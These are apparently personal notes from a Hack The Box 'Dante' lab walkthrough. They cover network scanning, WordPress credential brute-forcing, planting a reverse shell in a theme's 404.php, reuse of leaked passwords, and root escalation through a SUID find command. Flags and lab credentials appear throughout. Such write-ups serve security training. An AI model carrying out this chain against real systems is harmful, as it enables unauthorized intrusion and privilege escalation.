# 10.10.110.0/24
- `for i in {1..254} ;do (ping -c 1 10.10.110.$i | grep "bytes from" &) ;done`
- 10.10.110.2 - **no ports open**
- 10.10.110.100

https://karol-mazurek.medium.com/dante-guide-htb-a7dfd0387a9c

## 10.10.110.100 - DANTE-WEB-NIX01
### NMAP
- 10.10.110.100
```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 8fa2ffcf4e3eaa2bc26ff45a2ad9e9da (RSA)
|   256 07838eb6f7e672e965db42fdedd693ee (ECDSA)
|_  256 1345c5cadba6b4ae9c097d21cd9d74f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- ftp has a todo list
```
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```
- port 65000 => wordpress 5.4.1
- `/wordpress/wp-login.php` - trying to brute force with `james`
- running wp-scan on the xmlrpc endpoint, we get a `wp.config.php.swp` file
- `strings wp.config.swp` gives
```
DANTE-WEB-NIX01
/var/www/html/wordpress/wp-config.php

define( 'DB_PASSWORD', 'password' );
define( 'DB_USER', 'shaun' );
define( 'DB_NAME', 'wordpress' );
```

- `cewl 10.10.110.100:65000/wordpress/languages-and-frameworks -w words.txt`
- running this words.txt as passwords in burp we get
    - `james:Toyota`
- logged in to wordpress, theme editor, twetynineteen/404.php (replaced a reverse shell)
- accessed `wp-content/themes/twetynineteen/404.php` and got a `www-data` reverse shell on `nc`
- `su james` with `Toyota` gives shell as James - got flag.txt `DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}`
- running `linpeas.sh`
```
mysql -u balthazar -p TheJoker12345!
-rwsr-xr-x 1 root root 313K Feb 17  2020 /usr/bin/find

```
- `su balthazar` with `TheJoker12345!`
- `/usr/bin/find . -exec /bin/sh -p \; -quit`
    - get root - DANTE{Too_much_Pr1v!!!!}

